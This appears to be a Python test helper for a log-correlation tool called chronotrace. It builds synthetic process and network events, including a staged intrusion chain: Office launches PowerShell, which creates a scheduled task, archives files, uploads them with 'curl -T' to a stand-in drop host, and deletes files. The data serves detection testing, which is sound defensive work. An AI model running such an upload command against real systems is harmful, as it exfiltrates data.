import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from chronotrace import ingest  # noqa: E402

BASE = "2026-07-14T12:00:00Z"


def iso(sec, ms=0):
    from chronotrace.util import fmt_ms, parse_time_ms
    return fmt_ms(parse_time_ms(BASE) + int(sec * 1000) + ms)


def write_dir(files):
    """files: {"name.jsonl": [dict | str, ...]} -> temp dir path (caller keeps TemporaryDirectory alive)."""
    d = tempfile.TemporaryDirectory()
    for name, rows in files.items():
        with open(os.path.join(d.name, name), "w", encoding="utf-8", newline="\n") as f:
            f.write("\n".join(r if isinstance(r, str) else json.dumps(r) for r in rows) + "\n")
    return d


def load(files):
    d = write_dir(files)
    try:
        return ingest.load_dir(d.name)
    finally:
        d.cleanup()


def proc(t, image, parent, host="H1", event="process_start", cmd="", corr=""):
    r = {"timestamp": iso(t), "host": host, "user": "u", "image": image, "parent_image": parent,
         "command_line": cmd, "event": event}
    if corr:
        r["correlation_id"] = corr
    return r


def net(t, dst, host="H1", corr="", event="connection"):
    r = {"ts": iso(t), "host": host, "dst": dst, "event": event}
    if corr:
        r["correlation_id"] = corr
    return r


def chain_rows(office="WINWORD.EXE", script="powershell.exe", arch="tar.exe", xfer="curl.exe", host="H1"):
    return [proc(0, script, office, host),
            proc(1, "schtasks.exe", script, host),
            proc(4, arch, script, host),
            proc(7, xfer, script, host, cmd=f"{xfer} -T a.zip https://drop.example.invalid/u", corr="X1"),
            proc(9, "cmd.exe", script, host, event="file_delete")]
